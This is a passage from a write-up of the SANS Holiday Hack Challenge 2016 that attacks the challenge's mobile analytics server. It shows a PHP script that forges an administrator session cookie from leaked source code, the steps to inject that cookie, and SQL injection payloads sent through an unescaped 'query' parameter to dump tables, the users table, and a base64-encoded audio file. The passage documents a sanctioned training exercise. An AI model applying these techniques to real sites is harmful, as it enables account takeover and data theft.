mysql> GRANT ALL PRIVILEGES ON *.* TO 'sprusage'@'localhost';
Query OK, 0 rows affected (0.04 sec)

mysql> FLUSH PRIVILEGES;
Query OK, 0 rows affected (0.00 sec)

mysql> exit;
Bye
```

Now to update `db.php` setting the new password.

```yaml
<?php
  $dbHost = 'localhost';
  $dbUsername = 'sprusage';
  $dbPassword = 'SANS2016';
  $dbName = 'sprusage';
  $db = mysqli_connect($dbHost, $dbUsername, $dbPassword, $dbName);

  if(!$db) {
    reply(500, "Couldn't connect to the database!");
    exit(1);
  }
<!--OUTPUT TRUNCATED-->
```

All the files from the .git pull have been placed in `/var/www/html/` so simply browsing to the Kali VM's IP address on port 80 should show my local version of the analytics web application.

![locally_hosted_analytics](/assets/images/sans2016/locally_hosted_analytics.png)

Great, it works!

By taking the cookie generating code from `login.php`, I created a new PHP file called `admin_cookie.php` which looks like this:

```yaml
<?php
  # This should be the first require
  require_once('this_is_html.php');
  require_once('crypto.php');
  require_once('db.php');

$auth = encrypt(json_encode([
      'username' => 'administrator',
      'date' => date(DateTime::ISO8601),
    ]));

	setcookie('AUTH', bin2hex($auth));
	echo '[*] Administrator Session Cookie Generated:  AUTH='; 
	echo bin2hex($auth);

?>
```
Keeping the required files at the top, hardcoding the username to `administrator` then echoing out the generated session (AUTH) cookie.  This is what it looks like when you view it in the browser:

![admin_cookie](/assets/images/sans2016/analytics_admin_cookie.png)

With this session cookie, I am essentially the administrator user, just have to inject it. To do that, go back to the real analytics site and use the [Cookies Manager+](https://addons.mozilla.org/en-US/firefox/addon/cookies-manager-plus) Firefox add-on.

![admin_cookie](/assets/images/sans2016/admin_login1.png)

Logging in with the guest account first.

![admin_cookie](/assets/images/sans2016/admin_login2.png)
Finding the current session cookie.  Open Cookies Manager+ (1), search for the domain and press edit (2).

![admin_cookie](/assets/images/sans2016/admin_login3.png)
Replacing the guest user session cookie with the generated administrator one. Then refresh the page.

![admin_cookie](/assets/images/sans2016/admin_login4.png)
Boom goes the dynamite.  The `edit.php` page is now accessible. 

Now that I have administrator access it's time to move on to exploit the final vulnerability on this host which is SQL injection.  [SQLMap](http://sqlmap.org/)
won't help with this one though.  It takes a few steps to get setup so let's get going.

First, create a query and check the "Save Query" box.  Doesn't matter if it contains data or not, then press "Run Query."

![sqli_setup1](/assets/images/sans2016/sqli_setup1.png)

This query is now saved under 14ee7e28-9835-4fe6-a3f4-e4d4127d0d22

![sqli_setup2](/assets/images/sans2016/sqli_setup2.png)

The generated link for this report is `https://analytics.northpolewonderland.com/view.php?id=14ee7e28-9835-4fe6-a3f4-e4d4127d0d22`

![sqli_setup2](/assets/images/sans2016/sqli_setup3.png)

Before moving to the next step, let's take a quick look at the `query.php` file pulled from the .git repo.

```yaml
josh@MacBook-Pro /opt/dvcs-ripper (master*) $ cat query.php
<!--OUTPUT TRUNCATED-->
      $value = mysqli_real_escape_string($db, $values[$i]);

      $where[] = "`$field` $modifier '$value'";
    }
    $where[] = "`date`='" . mysqli_real_escape_string($db, $date) . "' ";

    $type = $_REQUEST['type'];
    if($type !== 'launch' && $type !== 'usage') {
      reply(400, "Type has to be either 'launch' or 'usage'!");
    }

    $query = "SELECT * ";
    $query .= "FROM `app_" . $type . "_reports` ";
    $query .= "WHERE " . join(' AND ', $where) . " ";
    $query .= "LIMIT 0, 100";

    if(isset($_REQUEST['save'])) {
      $id = gen_uuid();
      $name = "report-$id";
      $description = "Report generated @ " . date('Y-m-d H:i:s');
      $result = mysqli_query($db, "INSERT INTO `reports`
        (`id`, `name`, `description`, `query`)
      VALUES
        ('$id', '$name', '$description', '" . mysqli_real_escape_string($db, $query) . "')
        ");

      if(!$result) {
        reply(500, "Error saving report: " . mysqli_error($db));
        die();
      }
<!--OUTPUT TRUNCATED-->
```
See the issue?  There is another parameter being passed called `$query` and it doesn't have the same protections that the other fields do.  Plus, it's being stored in `$results`.

Remember that I have a query saved with an `$id` number already assigned.  Next, head over to the unlocked Edit page, enter the ID (14ee7e28-9835-4fe6-a3f4-e4d4127d0d22), the name and description fields can be blank. Finally, capture that request in a proxy...

![sqli_setup5](/assets/images/sans2016/sqli_setup4.png)

Add `&query=SHOW TABLES;` to the HTTP GET request and forward the request...

![sqli_setup6](/assets/images/sans2016/sqli_setup5.png)

The query string has been saved successfully.  To view the results, head to the View page.

![sqli_setup6](/assets/images/sans2016/sqli_setup6.png)

Enter the saved ID number one more time...

![sqli_setup6](/assets/images/sans2016/sqli_setup7.png)

Now I can see the tables inside the database.  Time to dig deeper and enter different commands to read more data from the database.

![sqli_setup6](/assets/images/sans2016/sqli_setup8.png)

Repeate the steps above with `&query=SELECT * FROM audio;`

![sqli_setup6](/assets/images/sans2016/sqli_setup9.png)

The audio file name is disclosed but how to download it?  Let's think about this, it is possible to query and display text.  Why not try to convert the file to text? Base64 to the rescue!

`&query=SELECT id, filename, TO_BASE64(mp3) FROM audio WHERE filename='discombobulatedaudio7.mp3';`

![sqli_setup6](/assets/images/sans2016/sqli_setup10.png)

Copy the wall of text (the base64 encoded MP3 file), save it to a text file, and decode it locally.

`josh@MacBook-Pro /$ cat base64_encoded_audio.txt | base64 -D > discombobulatedaudio7.mp3`

That's it.

One last fun thing is to see what the administrator's password is in cleartext, because, why not? `&query=SELECT * FROM users;`

![sqli_setup6](/assets/images/sans2016/sqli_setup11.png)



What are the names of the audio files you discovered from each system above? There are a total of SEVEN audio files (one from the original APK in Question 4, plus one for each of the six items in the bullet list above.) 
{: .notice}

|Number | Target | File Name
|:------------- |:-------------:|:-------------:|
|1|The Mobile Analytics Server (via credentialed login access) | [discombobulatedaudio2.mp3](/assets/files/discombobulatedaudio2.mp3)|
|2|The Mobile Analytics Server (post authentication)| [discombobulatedaudio7.mp3](/assets/files/discombobulatedaudio7.mp3) |
|3|The Dungeon Game | [discombobulatedaudio3.mp3](/assets/files/discombobulatedaudio3.mp3) |
|4|The Debug Server | [debug-20161224235959-0.mp3](/assets/files/debug-20161224235959-0.mp3) |
|5|The Banner Ad Server | [discombobulatedaudio5.mp3](/assets/files/discombobulatedaudio5.mp3) |
|6|The Uncaught Exception Handler Server | [discombobulated-audio-6-XyzE3N9YqKNH.mp3](/assets/files/discombobulated-audio-6-XyzE3N9YqKNH.mp3) |
|7|The SantaGram APK | [discombobulatedaudio1.mp3](/assets/files/discombobulatedaudio1.mp3) |
